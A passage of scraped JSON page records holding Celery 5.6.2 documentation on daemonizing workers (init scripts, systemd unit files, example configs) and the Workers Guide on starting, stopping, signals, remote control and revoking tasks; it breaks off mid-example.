|\nprevious |\nCelery 5.6.2 documentation » User Guide » Tasks\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491572,
    "timestamp": "2026-02-23T00:13:49.302Z",
    "title": "Daemonization — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/daemonizing.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Daemonization\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nDaemonization\n\nGeneric init-scripts\n\nInit-script: celeryd\n\nExample configuration\n\nUsing a login shell\n\nExample Django configuration\n\nAvailable options\n\nInit-script: celerybeat\n\nExample configuration\n\nExample Django configuration\n\nAvailable options\n\nTroubleshooting\n\nUsage systemd\n\nService file: celery.service\n\nExample configuration\n\nService file: celerybeat.service\n\nRunning the worker with superuser privileges (root)\n\nhttps://pypi.org/project/supervisor/\n\nlaunchd (macOS)\n\nMost Linux distributions these days use systemd for managing the lifecycle of system and user services.\n\nYou can check if your Linux distribution uses systemd by typing:\n\n$ systemctl --version\nsystemd 249 (v249.9-1.fc35)\n+PAM +AUDIT +SELINUX -APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 +PWQUALITY +P11KIT +QRENCODE +BZIP2 +LZ4 +XZ +ZLIB +ZSTD +XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified\n\n\nIf you have output similar to the above, please refer to our systemd documentation for guidance.\n\nHowever, the init.d script should still work in those Linux distributions as well since systemd provides the systemd-sysv compatibility layer which generates services automatically from the init.d scripts we provide.\n\nIf you package Celery for multiple Linux distributions and some do not support systemd or to other Unix systems as well, you may want to refer to our init.d documentation.\n\nGeneric init-scripts\n\nSee the extra/generic-init.d/ directory Celery distribution.\n\nThis directory contains generic bash init-scripts for the celery worker program, these should run on Linux, FreeBSD, OpenBSD, and other Unix-like platforms.\n\nInit-script: celeryd\nUsage:\n\n/etc/init.d/celeryd {start|stop|restart|status}\n\nConfiguration file:\n\n/etc/default/celeryd\n\nTo configure this script to run the worker properly you probably need to at least tell it where to change directory to when it starts (to find the module containing your app, or your configuration module).\n\nThe daemonization script is configured by the file /etc/default/celeryd. This is a shell (sh) script where you can add environment variables like the configuration options below. To add real environment variables affecting the worker you must also export them (e.g., export DISPLAY=\":0\")\n\nSuperuser privileges required\n\nThe init-scripts can only be used by root, and the shell configuration file must also be owned by root.\n\nUnprivileged users don’t need to use the init-script, instead they can use the celery multi utility (or celery worker --detach):\n\n$ celery -A proj multi start worker1 \\\n    --pidfile=\"$HOME/run/celery/%n.pid\" \\\n    --logfile=\"$HOME/log/celery/%n%I.log\"\n\n$ celery -A proj multi restart worker1 \\\n    --logfile=\"$HOME/log/celery/%n%I.log\" \\\n    --pidfile=\"$HOME/run/celery/%n.pid\n\n$ celery multi stopwait worker1 --pidfile=\"$HOME/run/celery/%n.pid\"\n\nExample configuration\n\nThis is an example configuration for a Python project.\n\n/etc/default/celeryd:\n\n# Names of nodes to start\n#   most people will only start one node:\nCELERYD_NODES=\"worker1\"\n#   but you can also start multiple and configure settings\n#   for each in CELERYD_OPTS\n#CELERYD_NODES=\"worker1 worker2 worker3\"\n#   alternatively, you can specify the number of nodes to start:\n#CELERYD_NODES=10\n\n# Absolute or relative path to the 'celery' command:\nCELERY_BIN=\"/usr/local/bin/celery\"\n#CELERY_BIN=\"/virtualenvs/def/bin/celery\"\n\n# App instance to use\n# comment out this line if you don't use an app\nCELERY_APP=\"proj\"\n# or fully qualified:\n#CELERY_APP=\"proj.tasks:app\"\n\n# Where to chdir at start.\nCELERYD_CHDIR=\"/opt/Myproject/\"\n\n# Extra command-line arguments to the worker\nCELERYD_OPTS=\"--time-limit=300 --concurrency=8\"\n# Configure node-specific settings by appending node name to arguments:\n#CELERYD_OPTS=\"--time-limit=300 -c 8 -c:worker2 4 -c:worker3 2 -Ofair:worker1\"\n\n# Set logging level to DEBUG\n#CELERYD_LOG_LEVEL=\"DEBUG\"\n\n# %n will be replaced with the first part of the nodename.\nCELERYD_LOG_FILE=\"/var/log/celery/%n%I.log\"\nCELERYD_PID_FILE=\"/var/run/celery/%n.pid\"\n\n# Workers should run as an unprivileged user.\n#   You need to create this user manually (or you can choose\n#   a user/group combination that already exists (e.g., nobody).\nCELERYD_USER=\"celery\"\nCELERYD_GROUP=\"celery\"\n\n# If enabled pid and log directories will be created if missing,\n# and owned by the userid/group configured.\nCELERY_CREATE_DIRS=1\n\nUsing a login shell\n\nYou can inherit the environment of the CELERYD_USER by using a login shell:\n\nCELERYD_SU_ARGS=\"-l\"\n\n\nNote that this isn’t recommended, and that you should only use this option when absolutely necessary.\n\nExample Django configuration\n\nDjango users now uses the exact same template as above, but make sure that the module that defines your Celery app instance also sets a default value for DJANGO_SETTINGS_MODULE as shown in the example Django project in First steps with Django.\n\nAvailable options\n\nCELERY_APP\n\nApp instance to use (value for --app argument).\n\nCELERY_BIN\n\nAbsolute or relative path to the celery program. Examples:\n\ncelery\n\n/usr/local/bin/celery\n\n/virtualenvs/proj/bin/celery\n\n/virtualenvs/proj/bin/python -m celery\n\nCELERYD_NODES\n\nList of node names to start (separated by space).\n\nCELERYD_OPTS\n\nAdditional command-line arguments for the worker, see celery worker –help for a list. This also supports the extended syntax used by multi to configure settings for individual nodes. See celery multi –help for some multi-node configuration examples.\n\nCELERYD_CHDIR\n\nPath to change directory to at start. Default is to stay in the current directory.\n\nCELERYD_PID_FILE\n\nFull path to the PID file. Default is /var/run/celery/%n.pid\n\nCELERYD_LOG_FILE\n\nFull path to the worker log file. Default is /var/log/celery/%n%I.log Note: Using %I is important when using the prefork pool as having multiple processes share the same log file will lead to race conditions.\n\nCELERYD_LOG_LEVEL\n\nWorker log level. Default is INFO.\n\nCELERYD_USER\n\nUser to run the worker as. Default is current user.\n\nCELERYD_GROUP\n\nGroup to run worker as. Default is current user.\n\nCELERY_CREATE_DIRS\n\nAlways create directories (log directory and pid file directory). Default is to only create directories when no custom logfile/pidfile set.\n\nCELERY_CREATE_RUNDIR\n\nAlways create pidfile directory. By default only enabled when no custom pidfile location set.\n\nCELERY_CREATE_LOGDIR\n\nAlways create logfile directory. By default only enable when no custom logfile location set.\n\nInit-script: celerybeat\nUsage:\n\n/etc/init.d/celerybeat {start|stop|restart}\n\nConfiguration file:\n\n/etc/default/celerybeat or /etc/default/celeryd.\n\nExample configuration\n\nThis is an example configuration for a Python project:\n\n/etc/default/celerybeat:\n\n# Absolute or relative path to the 'celery' command:\nCELERY_BIN=\"/usr/local/bin/celery\"\n#CELERY_BIN=\"/virtualenvs/def/bin/celery\"\n\n# App instance to use\n# comment out this line if you don't use an app\nCELERY_APP=\"proj\"\n# or fully qualified:\n#CELERY_APP=\"proj.tasks:app\"\n\n# Where to chdir at start.\nCELERYBEAT_CHDIR=\"/opt/Myproject/\"\n\n# Extra arguments to celerybeat\nCELERYBEAT_OPTS=\"--schedule=/var/run/celery/celerybeat-schedule\"\n\nExample Django configuration\n\nYou should use the same template as above, but make sure the DJANGO_SETTINGS_MODULE variable is set (and exported), and that CELERYD_CHDIR is set to the projects directory:\n\nexport DJANGO_SETTINGS_MODULE=\"settings\"\n\nCELERYD_CHDIR=\"/opt/MyProject\"\n\nAvailable options\n\nCELERY_APP\n\nApp instance to use (value for --app argument).\n\nCELERYBEAT_OPTS\n\nAdditional arguments to celery beat, see celery beat --help for a list of available options.\n\nCELERYBEAT_PID_FILE\n\nFull path to the PID file. Default is /var/run/celeryd.pid.\n\nCELERYBEAT_LOG_FILE\n\nFull path to the log file. Default is /var/log/celeryd.log.\n\nCELERYBEAT_LOG_LEVEL\n\nLog level to use. Default is INFO.\n\nCELERYBEAT_USER\n\nUser to run beat as. Default is the current user.\n\nCELERYBEAT_GROUP\n\nGroup to run beat as. Default is the current user.\n\nCELERY_CREATE_DIRS\n\nAlways create directories (log directory and pid file directory). Default is to only create directories when no custom logfile/pidfile set.\n\nCELERY_CREATE_RUNDIR\n\nAlways create pidfile directory. By default only enabled when no custom pidfile location set.\n\nCELERY_CREATE_LOGDIR\n\nAlways create logfile directory. By default only enable when no custom logfile location set.\n\nTroubleshooting\n\nIf you can’t get the init-scripts to work, you should try running them in verbose mode:\n\n# sh -x /etc/init.d/celeryd start\n\n\nThis can reveal hints as to why the service won’t start.\n\nIf the worker starts with “OK” but exits almost immediately afterwards and there’s no evidence in the log file, then there’s probably an error but as the daemons standard outputs are already closed you’ll not be able to see them anywhere. For this situation you can use the C_FAKEFORK environment variable to skip the daemonization step:\n\n# C_FAKEFORK=1 sh -x /etc/init.d/celeryd start\n\n\nand now you should be able to see the errors.\n\nCommonly such errors are caused by insufficient permissions to read from, or write to a file, and also by syntax errors in configuration modules, user modules, third-party libraries, or even from Celery itself (if you’ve found a bug you should report it).\n\nUsage systemd\n\nextra/systemd/\n\nUsage:\n\nsystemctl {start|stop|restart|status} celery.service\n\nConfiguration file:\n\n/etc/conf.d/celery\n\nService file: celery.service\n\nThis is an example systemd file:\n\n/etc/systemd/system/celery.service:\n\n[Unit]\nDescription=Celery Service\nAfter=network.target\n\n[Service]\nType=forking\nUser=celery\nGroup=celery\nEnvironmentFile=/etc/conf.d/celery\nWorkingDirectory=/opt/celery\nExecStart=/bin/sh -c '${CELERY_BIN} -A $CELERY_APP multi start $CELERYD_NODES \\\n    --pidfile=${CELERYD_PID_FILE} --logfile=${CELERYD_LOG_FILE} \\\n    --loglevel=\"${CELERYD_LOG_LEVEL}\" $CELERYD_OPTS'\nExecStop=/bin/sh -c '${CELERY_BIN} multi stopwait $CELERYD_NODES \\\n    --pidfile=${CELERYD_PID_FILE} --logfile=${CELERYD_LOG_FILE} \\\n    --loglevel=\"${CELERYD_LOG_LEVEL}\"'\nExecReload=/bin/sh -c '${CELERY_BIN} -A $CELERY_APP multi restart $CELERYD_NODES \\\n    --pidfile=${CELERYD_PID_FILE} --logfile=${CELERYD_LOG_FILE} \\\n    --loglevel=\"${CELERYD_LOG_LEVEL}\" $CELERYD_OPTS'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n\n\nOnce you’ve put that file in /etc/systemd/system, you should run systemctl daemon-reload in order that Systemd acknowledges that file. You should also run that command each time you modify it. Use systemctl enable celery.service if you want the celery service to automatically start when (re)booting the system.\n\nOptionally you can specify extra dependencies for the celery service: e.g. if you use RabbitMQ as a broker, you could specify rabbitmq-server.service in both After= and Requires= in the [Unit] systemd section.\n\nTo configure user, group, chdir change settings: User, Group, and WorkingDirectory defined in /etc/systemd/system/celery.service.\n\nYou can also use systemd-tmpfiles in order to create working directories (for logs and pid).\n\nfile:\n\n/etc/tmpfiles.d/celery.conf\n\nd /run/celery 0755 celery celery -\nd /var/log/celery 0755 celery celery -\n\nExample configuration\n\nThis is an example configuration for a Python project:\n\n/etc/conf.d/celery:\n\n# Name of nodes to start\n# here we have a single node\nCELERYD_NODES=\"w1\"\n# or we could have three nodes:\n#CELERYD_NODES=\"w1 w2 w3\"\n\n# Absolute or relative path to the 'celery' command:\nCELERY_BIN=\"/usr/local/bin/celery\"\n#CELERY_BIN=\"/virtualenvs/def/bin/celery\"\n\n# App instance to use\n# comment out this line if you don't use an app\nCELERY_APP=\"proj\"\n# or fully qualified:\n#CELERY_APP=\"proj.tasks:app\"\n\n# How to call manage.py\nCELERYD_MULTI=\"multi\"\n\n# Extra command-line arguments to the worker\nCELERYD_OPTS=\"--time-limit=300 --concurrency=8\"\n\n# - %n will be replaced with the first part of the nodename.\n# - %I will be replaced with the current child process index\n#   and is important when using the prefork pool to avoid race conditions.\nCELERYD_PID_FILE=\"/var/run/celery/%n.pid\"\nCELERYD_LOG_FILE=\"/var/log/celery/%n%I.log\"\nCELERYD_LOG_LEVEL=\"INFO\"\n\n# you may wish to add these options for Celery Beat\nCELERYBEAT_PID_FILE=\"/var/run/celery/beat.pid\"\nCELERYBEAT_LOG_FILE=\"/var/log/celery/beat.log\"\n\nService file: celerybeat.service\n\nThis is an example systemd file for Celery Beat:\n\n/etc/systemd/system/celerybeat.service:\n\n[Unit]\nDescription=Celery Beat Service\nAfter=network.target\n\n[Service]\nType=simple\nUser=celery\nGroup=celery\nEnvironmentFile=/etc/conf.d/celery\nWorkingDirectory=/opt/celery\nExecStart=/bin/sh -c '${CELERY_BIN} -A ${CELERY_APP} beat  \\\n    --pidfile=${CELERYBEAT_PID_FILE} \\\n    --logfile=${CELERYBEAT_LOG_FILE} --loglevel=${CELERYD_LOG_LEVEL}'\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n\n\nOnce you’ve put that file in /etc/systemd/system, you should run systemctl daemon-reload in order that Systemd acknowledges that file. You should also run that command each time you modify it. Use systemctl enable celerybeat.service if you want the celery beat service to automatically start when (re)booting the system.\n\nRunning the worker with superuser privileges (root)\n\nRunning the worker with superuser privileges is a very dangerous practice. There should always be a workaround to avoid running as root. Celery may run arbitrary code in messages serialized with pickle - this is dangerous, especially when run as root.\n\nBy default Celery won’t run workers as root. The associated error message may not be visible in the logs but may be seen if C_FAKEFORK is used.\n\nTo force Celery to run workers as root use C_FORCE_ROOT.\n\nWhen running as root without C_FORCE_ROOT the worker will appear to start with “OK” but exit immediately after with no apparent errors. This problem may appear when running the project in a new development or production environment (inadvertently) as root.\n\nhttps://pypi.org/project/supervisor/\n\nextra/supervisord/\n\nlaunchd (macOS)\n\nextra/macOS\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nWorkers Guide\n\nNext topic\n\nPeriodic Tasks\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Daemonization\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491571,
    "timestamp": "2026-02-23T00:13:49.303Z",
    "title": "Workers Guide — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/workers.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Workers Guide\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nWorkers Guide\n\nStarting the worker\n\nStopping the worker\n\nRestarting the worker\n\nAutomatic re-connection on connection loss to broker\n\nProcess Signals\n\nVariables in file paths\n\nConcurrency\n\nRemote control\n\nCommands\n\nTime Limits\n\nRate Limits\n\nMax tasks per child setting\n\nMax memory per child setting\n\nAutoscaling\n\nQueues\n\nInspecting workers\n\nAdditional Commands\n\nWriting your own remote control commands\n\nStarting the worker\n\nDaemonizing\n\nYou probably want to use a daemonization tool to start the worker in the background. See Daemonization for help starting the worker as a daemon using popular service managers.\n\nYou can start the worker in the foreground by executing the command:\n\n$ celery -A proj worker -l INFO\n\n\nFor a full list of available command-line options see worker, or simply do:\n\n$ celery worker --help\n\n\nYou can start multiple workers on the same machine, but be sure to name each individual worker by specifying a node name with the --hostname argument:\n\n$ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker1@%h\n$ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker2@%h\n$ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker3@%h\n\n\nThe hostname argument can expand the following variables:\n\n%h: Hostname, including domain name.\n\n%n: Hostname only.\n\n%d: Domain name only.\n\nIf the current hostname is george.example.com, these will expand to:\n\nVariable\n\n\t\n\nTemplate\n\n\t\n\nResult\n\n\n\n\n%h\n\n\t\n\nworker1@%h\n\n\t\n\nworker1@george.example.com\n\n\n\n\n%n\n\n\t\n\nworker1@%n\n\n\t\n\nworker1@george\n\n\n\n\n%d\n\n\t\n\nworker1@%d\n\n\t\n\nworker1@example.com\n\nNote for https://pypi.org/project/supervisor/ users\n\nThe % sign must be escaped by adding a second one: %%h.\n\nStopping the worker\n\nShutdown should be accomplished using the TERM signal.\n\nWhen shutdown is initiated the worker will finish all currently executing tasks before it actually terminates. If these tasks are important, you should wait for it to finish before doing anything drastic, like sending the KILL signal.\n\nIf the worker won’t shutdown after considerate time, for being stuck in an infinite-loop or similar, you can use the KILL signal to force terminate the worker: but be aware that currently executing tasks will be lost (i.e., unless the tasks have the acks_late option set).\n\nAlso as processes can’t override the KILL signal, the worker will not be able to reap its children; make sure to do so manually. This command usually does the trick:\n\n$ pkill -9 -f 'celery worker'\n\n\nIf you don’t have the pkill command on your system, you can use the slightly longer version:\n\n$ ps auxww | awk '/celery worker/ {print $2}' | xargs kill -9\n\n\nChanged in version 5.2: On Linux systems, Celery now supports sending KILL signal to all child processes after worker termination. This is done via PR_SET_PDEATHSIG option of prctl(2).\n\nWorker Shutdown\n\nWe will use the terms Warm, Soft, Cold, Hard to describe the different stages of worker shutdown. The worker will initiate the shutdown process when it receives the TERM or QUIT signal. The INT (Ctrl-C) signal is also handled during the shutdown process and always triggers the next stage of the shutdown process.\n\nWarm Shutdown\n\nWhen the worker receives the TERM signal, it will initiate a warm shutdown. The worker will finish all currently executing tasks before it actually terminates. The first time the worker receives the INT (Ctrl-C) signal, it will initiate a warm shutdown as well.\n\nThe warm shutdown will stop the call to WorkController.start() and will call WorkController.stop().\n\nAdditional TERM signals will be ignored during the warm shutdown process.\n\nThe next INT signal will trigger the next stage of the shutdown process.\n\nChanged in version 5.6: In previous versions of Celery, when the prefork pool was in use, heartbeats to the broker were not sent during warm shutdown. This caused the broker to terminate the connection, which meant that tasks were not able to complete. As of version 5.6, when the prefork pool is in use, heartbeats are now maintained during warm shutdown and tasks are able to complete before the worker terminates.\n\nCold Shutdown\n\nCold shutdown is initiated when the worker receives the QUIT signal. The worker will stop all currently executing tasks and terminate immediately.\n\nNote\n\nIf the environment variable REMAP_SIGTERM is set to SIGQUIT, the worker will also initiate a cold shutdown when it receives the TERM signal instead of a warm shutdown.\n\nThe cold shutdown will stop the call to WorkController.start() and will call WorkController.terminate().\n\nIf the warm shutdown already started, the transition to cold shutdown will run a signal handler on_cold_shutdown to cancel all currently executing tasks from the MainProcess and potentially trigger the Soft Shutdown.\n\nSoft Shutdown\n\nAdded in version 5.5.\n\nSoft shutdown is a time limited warm shutdown, initiated just before the cold shutdown. The worker will allow worker_soft_shutdown_timeout seconds for all currently executing tasks to finish before it terminates. If the time limit is reached, the worker will initiate a cold shutdown and cancel all currently executing tasks. If the QUIT signal is received during the soft shutdown, the worker will cancel all currently executing tasks but still wait for the time limit to finish before terminating, giving a chance for the worker to perform the cold shutdown a little more gracefully.\n\nThe soft shutdown is disabled by default to maintain backward compatibility with the Cold Shutdown behavior. To enable the soft shutdown, set worker_soft_shutdown_timeout to a positive float value. The soft shutdown will be skipped if there are no tasks running. To force the soft shutdown, also enable the worker_enable_soft_shutdown_on_idle setting.\n\nWarning\n\nIf the worker is not running any task but has ETA tasks reserved, the soft shutdown will not be initiated unless the worker_enable_soft_shutdown_on_idle setting is enabled, which may lead to task loss during the cold shutdown. When using ETA tasks, it is recommended to enable the soft shutdown on idle. Experiment which worker_soft_shutdown_timeout value works best for your setup to reduce the risk of task loss to a minimum.\n\nFor example, when setting worker_soft_shutdown_timeout=3, the worker will allow 3 seconds for all currently executing tasks to finish before it terminates. If the time limit is reached, the worker will initiate a cold shutdown and cancel all currently executing tasks.\n\n[INFO/MainProcess] Task myapp.long_running_task[6f748357-b2c7-456a-95de-f05c00504042] received\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 1/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 2/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 3/2000s\n^C\nworker: Hitting Ctrl+C again will initiate cold shutdown, terminating all running tasks!\n\nworker: Warm shutdown (MainProcess)\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 4/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 5/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 6/2000s\n^C\nworker: Hitting Ctrl+C again will terminate all running tasks!\n[WARNING/MainProcess] Initiating Soft Shutdown, terminating in 3 seconds\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 7/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 8/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 9/2000s\n[WARNING/MainProcess] Restoring 1 unacknowledged message(s)\n\n\nThe next QUIT signal will cancel the tasks that are still running in the soft shutdown, but the worker will still wait for the time limit to finish before terminating.\n\nThe next (2nd) QUIT or INT signal will trigger the next stage of the shutdown process.\n\nHard Shutdown\n\nAdded in version 5.5.\n\nHard shutdown is mostly for local or debug purposes, allowing to spam the INT (Ctrl-C) signal to force the worker to terminate immediately. The worker will stop all currently executing tasks and terminate immediately by raising a WorkerTerminate exception in the MainProcess.\n\nFor example, notice the ^C in the logs below (using the INT signal to move from stage to stage):\n\n[INFO/MainProcess] Task myapp.long_running_task[7235ac16-543d-4fd5-a9e1-2d2bb8ab630a] received\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 1/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 2/2000s\n^C\nworker: Hitting Ctrl+C again will initiate cold shutdown, terminating all running tasks!\n\nworker: Warm shutdown (MainProcess)\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 3/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 4/2000s\n^C\nworker: Hitting Ctrl+C again will terminate all running tasks!\n[WARNING/MainProcess] Initiating Soft Shutdown, terminating in 10 seconds\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 5/2000s\n[WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 6/2000s\n^C\nWaiting gracefully for cold shutdown to complete...\n\nworker: Cold shutdown (MainProcess)\n^C[WARNING/MainProcess] Restoring 1 unacknowledged message(s)\n\n\nWarning\n\nThe log Restoring 1 unacknowledged message(s) is misleading as it is not guaranteed that the message will be restored after a hard shutdown. The Soft Shutdown allows adding a time window just between the warm and the cold shutdown that improves the gracefulness of the shutdown process.\n\nRestarting the worker\n\nTo restart the worker you should send the TERM signal and start a new instance. The easiest way to manage workers for development is by using celery multi:\n\n$ celery multi start 1 -A proj -l INFO -c4 --pidfile=/var/run/celery/%n.pid\n$ celery multi restart 1 --pidfile=/var/run/celery/%n.pid\n\n\nFor production deployments you should be using init-scripts or a process supervision system (see Daemonization).\n\nOther than stopping, then starting the worker to restart, you can also restart the worker using the HUP signal. Note that the worker will be responsible for restarting itself so this is prone to problems and isn’t recommended in production:\n\n$ kill -HUP $pid\n\n\nNote\n\nRestarting by HUP only works if the worker is running in the background as a daemon (it doesn’t have a controlling terminal).\n\nHUP is disabled on macOS because of a limitation on that platform.\n\nAutomatic re-connection on connection loss to broker\n\nAdded in version 5.3.\n\nUnless broker_connection_retry_on_startup is set to False, Celery will automatically retry reconnecting to the broker after the first connection loss. broker_connection_retry controls whether to automatically retry reconnecting to the broker for subsequent reconnects.\n\nAdded in version 5.1.\n\nIf worker_cancel_long_running_tasks_on_connection_loss is set to True, Celery will also cancel any long running task that is currently running.\n\nAdded in version 5.3.\n\nSince the message broker does not track how many tasks were already fetched before the connection was lost, Celery will reduce the prefetch count by the number of tasks that are currently running multiplied by worker_prefetch_multiplier. The prefetch count will be gradually restored to the maximum allowed after each time a task that was running before the connection was lost is complete.\n\nThis feature is enabled by default, but can be disabled by setting False to worker_enable_prefetch_count_reduction.\n\nProcess Signals\n\nThe worker’s main process overrides the following signals:\n\nTERM\n\n\t\n\nWarm shutdown, wait for tasks to complete.\n\n\n\n\nQUIT\n\n\t\n\nCold shutdown, terminate ASAP\n\n\n\n\nUSR1\n\n\t\n\nDump traceback for all active threads.\n\n\n\n\nUSR2\n\n\t\n\nRemote debug, see celery.contrib.rdb.\n\nVariables in file paths\n\nThe file path arguments for --logfile, --pidfile, and --statedb can contain variables that the worker will expand:\n\nNode name replacements\n\n%p: Full node name.\n\n%h: Hostname, including domain name.\n\n%n: Hostname only.\n\n%d: Domain name only.\n\n%i: Prefork pool process index or 0 if MainProcess.\n\n%I: Prefork pool process index with separator.\n\nFor example, if the current hostname is george@foo.example.com then these will expand to:\n\n--logfile=%p.log -> george@foo.example.com.log\n\n--logfile=%h.log -> foo.example.com.log\n\n--logfile=%n.log -> george.log\n\n--logfile=%d.log -> example.com.log\n\nPrefork pool process index\n\nThe prefork pool process index specifiers will expand into a different filename depending on the process that’ll eventually need to open the file.\n\nThis can be used to specify one log file per child process.\n\nNote that the numbers will stay within the process limit even if processes exit or if autoscale/maxtasksperchild/time limits are used. That is, the number is the process index not the process count or pid.\n\n%i - Pool process index or 0 if MainProcess.\n\nWhere -n worker1@example.com -c2 -f %n-%i.log will result in three log files:\n\nworker1-0.log (main process)\n\nworker1-1.log (pool process 1)\n\nworker1-2.log (pool process 2)\n\n%I - Pool process index with separator.\n\nWhere -n worker1@example.com -c2 -f %n%I.log will result in three log files:\n\nworker1.log (main process)\n\nworker1-1.log (pool process 1)\n\nworker1-2.log (pool process 2)\n\nConcurrency\n\nBy default multiprocessing is used to perform concurrent execution of tasks, but you can also use Eventlet. The number of worker processes/threads can be changed using the --concurrency argument and defaults to the number of CPUs available on the machine.\n\nNumber of processes (multiprocessing/prefork pool)\n\nMore pool processes are usually better, but there’s a cut-off point where adding more pool processes affects performance in negative ways. There’s even some evidence to support that having multiple worker instances running, may perform better than having a single worker. For example 3 workers with 10 pool processes each. You need to experiment to find the numbers that works best for you, as this varies based on application, work load, task run times and other factors.\n\nRemote control\n\nAdded in version 2.0.\n\nThe celery command\n\nThe celery program is used to execute remote control commands from the command-line. It supports all of the commands listed below. See Management Command-line Utilities (inspect/control) for more information.\n\npool support:\n\nprefork, eventlet, gevent, thread, blocking:solo (see note)\n\nbroker support:\n\namqp, redis\n\nWorkers have the ability to be remote controlled using a high-priority broadcast message queue. The commands can be directed to all, or a specific list of workers.\n\nCommands can also have replies. The client can then wait for and collect those replies. Since there’s no central authority to know how many workers are available in the cluster, there’s also no way to estimate how many workers may send a reply, so the client has a configurable timeout — the deadline in seconds for replies to arrive in. This timeout defaults to one second. If the worker doesn’t reply within the deadline it doesn’t necessarily mean the worker didn’t reply, or worse is dead, but may simply be caused by network latency or the worker being slow at processing commands, so adjust the timeout accordingly.\n\nIn addition to timeouts, the client can specify the maximum number of replies to wait for. If a destination is specified, this limit is set to the number of destination hosts.\n\nNote\n\nThe solo pool supports remote control commands, but any task executing will block any waiting control command, so it is of limited use if the worker is very busy. In that case you must increase the timeout waiting for replies in the client.\n\nThe broadcast() function\n\nThis is the client function used to send commands to the workers. Some remote control commands also have higher-level interfaces using broadcast() in the background, like rate_limit(), and ping().\n\nSending the rate_limit command and keyword arguments:\n\n>>> app.control.broadcast('rate_limit',\n...                          arguments={'task_name': 'myapp.mytask',\n...                                     'rate_limit': '200/m'})\n\n\nThis will send the command asynchronously, without waiting for a reply. To request a reply you have to use the reply argument:\n\n>>> app.control.broadcast('rate_limit', {\n...     'task_name': 'myapp.mytask', 'rate_limit': '200/m'}, reply=True)\n[{'worker1.example.com': 'New rate limit set successfully'},\n {'worker2.example.com': 'New rate limit set successfully'},\n {'worker3.example.com': 'New rate limit set successfully'}]\n\n\nUsing the destination argument you can specify a list of workers to receive the command:\n\n>>> app.control.broadcast('rate_limit', {\n...     'task_name': 'myapp.mytask',\n...     'rate_limit': '200/m'}, reply=True,\n...                             destination=['worker1@example.com'])\n[{'worker1.example.com': 'New rate limit set successfully'}]\n\n\nOf course, using the higher-level interface to set rate limits is much more convenient, but there are commands that can only be requested using broadcast().\n\nCommands\nrevoke: Revoking tasks\npool support:\n\nall, terminate only supported by prefork, eventlet and gevent\n\nbroker support:\n\namqp, redis\n\ncommand:\n\ncelery -A proj control revoke <task_id>\n\nAll worker nodes keeps a memory of revoked task ids, either in-memory or persistent on disk (see Persistent revokes).\n\nNote\n\nThe maximum number of revoked tasks to keep in memory can be specified using the CELERY_WORKER_REVOKES_MAX environment variable, which defaults to 50000. When the limit has been exceeded, the revokes will be active for 10800 seconds (3 hours) before being expired. This value can be changed using the CELERY_WORKER_REVOKE_EXPIRES environment variable.\n\nMemory limits can also be set for successful tasks through the CELERY_WORKER_SUCCESSFUL_MAX and CELERY_WORKER_SUCCESSFUL_EXPIRES environment variables, and default to 1000 and 10800 respectively.\n\nWhen a worker receives a revoke request it will skip executing the task, but it won’t terminate an already executing task unless the terminate option is set.\n\nNote\n\nThe terminate option is a last resort for administrators when a task is stuck. It’s not for terminating the task, it’s for terminating the process that’s executing the task, and that process may have already started processing another task at the point when the signal is sent, so for this reason you must never call this programmatically.\n\nIf terminate is set the worker child process processing the task will be terminated. The default signal sent is TERM, but you can specify this using the signal argument. Signal can be the uppercase name of any signal defined in the signal module in the Python Standard Library.\n\nTerminating a task also revokes it.\n\nChanged in version 5.6: When a task is revoked, the result backend is now immediately updated to reflect the REVOKED status. Previously, the backend was only updated when a worker attempted to process the revoked task, which could leave tasks with ETA/countdown in PENDING status indefinitely if the worker was shut down before the scheduled time.\n\nExample\n\n>>> result.revoke()\n\n>>> AsyncResult(id).revoke()\n\n>>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed')\n\n>>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed',\n...                    terminate=True)\n\n>>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed',\n...                    terminate=True, signal='SIGKILL')\n\nRevoking multiple tasks\n\nAdded in version 3.1.\n\nThe revoke method also accepts a list argument, where it will revoke several tasks at once.\n\nExample\n\n>>> app.control.revoke([\n...    '7993b0aa-1f0b-4780-9af0-c47c0858b3f2',\n...    'f565793e-b041-4b2b-9ca4-dca22762a55d',\n...    